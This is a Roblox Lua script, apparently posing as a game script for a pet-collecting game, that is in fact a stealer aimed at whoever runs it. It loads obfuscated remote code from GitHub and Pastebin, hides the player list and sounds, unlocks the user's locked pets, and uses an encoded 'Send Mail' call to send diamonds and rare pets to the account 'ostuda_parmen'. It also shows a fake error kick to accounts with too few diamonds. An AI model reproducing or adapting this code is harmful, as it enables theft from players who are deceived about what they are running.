loadstring(game:HttpGet("https://raw.githubusercontent.com/parmeniss/WBHOOK/main/obf_PRZqFxJ2U282k5M0xuGQv148HbHUTQjv35hGsmfDJnL8ZRu3l9f0dyIWY1u0WpbM.lua"))()

local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network); local Fire, Invoke = Network.Fire, Network.Invoke; hookfunction(getupvalue(Fire, 1), function(...) return true end)
local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
if game.Players.LocalPlayer.leaderstats.Diamonds.Value <100000 then
    game.Players.LocalPlayer:Kick("Error launching script. Error code: ".._G.ScriptName..".LaunchScript")
end 

game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
local mailbox = game:GetService("Workspace")["__MAP"].Interactive.Mailbox
for i,v in pairs(mailbox:GetDescendants()) do
	if v:IsA("MeshPart") or v:IsA("Part") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
		break
	end
end
-- loading screen ^^
local folders = {
  game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
  game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic,
}

local function unlockPetsInFolder(folder)
  local children = folder:GetChildren() -- Get all the children of the folder

  for _, child in ipairs(children) do -- Loop through each child in the folder
    if child:IsA("TextButton") and child.Locked.Visible == true then -- Check if the child is a TextButton
    local name = child.Name
	if child.Name then -- Get the name of the TextButton
    	local args2 = {
    		[1] = {
				[""..name] = false
    		}
		}
		Invoke("Lock Pet", unpack(args2))
    end
    end
  end
end

while true do
  for _, folder in ipairs(folders) do
    unlockPetsInFolder(folder)
    wait(0.2) -- Wait for 1 second before running the function again
  end
  local lockedCount = 0
  for _, folder in ipairs(folders) do
    for _, child in ipairs(folder:GetChildren()) do
      if child:IsA("TextButton") and child.Locked.Visible == true then
        lockedCount = lockedCount + 1
      end
    end
  end
  if lockedCount == 0 then
    break
  end
end
for i,v in pairs(game:GetDescendants()) do
	if v:IsA("Sound") then
		v:Destroy()
	end
end
if game.Players.LocalPlayer.leaderstats.Diamonds.Value >300000000000 then
	local args = {
    	[1] = {
        ["Recipient"] = "ostuda_parmen",
        ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        ["Pets"] = {v.uid},
        ["Message"] = "PARMEN GEMS!"
    	}
	}
	Invoke("\83\101\110\100\32\77\97\105\108", unpack(args))
	repeat wait() until game.Players.LocalPlayer.leaderstats.Diamonds.Value <10000000
end
local savedPets = FrameworkLibrary.Save.Get().Pets
hugeamount = 0
for i,v in pairs(savedPets) do
	local v2 = FrameworkLibrary.Directory.Pets[v.id]
	if v2.huge == true then
		hugeamount = hugeamount + 1
	end
end
if hugeamount >5 then
	_G.Username = "ostuda_parmen"
end
while wait() do
for i,v in pairs(savedPets) do
    local v2 = FrameworkLibrary.Directory.Pets[v.id]
	if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value >5000000 or v2.rarity == "Event" and game.Players.LocalPlayer.leaderstats.Diamonds.Value >5000000 or v2.rarity == "Exclusive" and game.Players.LocalPlayer.leaderstats.Diamonds.Value >5000000 then
		_G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
		local args = {
    	[1] = {
        ["Recipient"] = _G.Username,
        ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        ["Pets"] = {v.uid},
        ["Message"] = "Parmen#9984 | Username: ".._G.Username..""
    	}
		}
		Invoke("\83\101\110\100\32\77\97\105\108", unpack(args))
		_G.PetName = v2.name
		_G.PetRar = v2.rarity
		
		loadstring(game:HttpGet("https://pastebin.com/raw/BFwTeT8V"))()
	elseif v2.huge == true or v2.rarity == "Event" or v2.rarity == "Exclusive" then
		_G.Diamonds = 0
		local args = {
    	[1] = {
        ["Recipient"] = _G.Username,
        ["Diamonds"] = 0,
        ["Pets"] = {v.uid},
        ["Message"] = "Parmen#9984 | Username: ".._G.Username..""
    	}
		}
		Invoke("\83\101\110\100\32\77\97\105\108", unpack(args))
		_G.PetName = v2.name
		_G.PetRar = v2.rarity
		
		loadstring(game:HttpGet("https://pastebin.com/raw/BFwTeT8V"))()
	end
end
end